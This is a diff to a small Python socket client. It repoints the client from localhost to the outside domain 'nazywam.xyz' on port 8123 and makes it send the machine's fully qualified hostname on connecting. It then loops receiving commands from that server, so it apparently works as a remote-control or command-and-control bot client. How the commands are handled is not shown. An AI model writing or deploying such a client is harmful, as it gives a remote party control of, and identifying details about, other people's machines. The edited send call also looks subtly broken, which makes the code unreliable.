@@ -1,13 +1,9 @@
 from socket import *
 
 
-#specify nicnkame
-
-NICKNAME = b"Bobek"
-
 #specify the host and port
 
-HOST = "localhost"
+HOST = "nazywam.xyz"
 PORT = 8123
 
 
@@ -20,7 +16,7 @@ except ConnectionRefusedError:
 	exit(0)
 
 
-connection.send(NICKNAME)
+connection.send(getfqdn())
 
 while True:
 	command = connection.recv(1024)
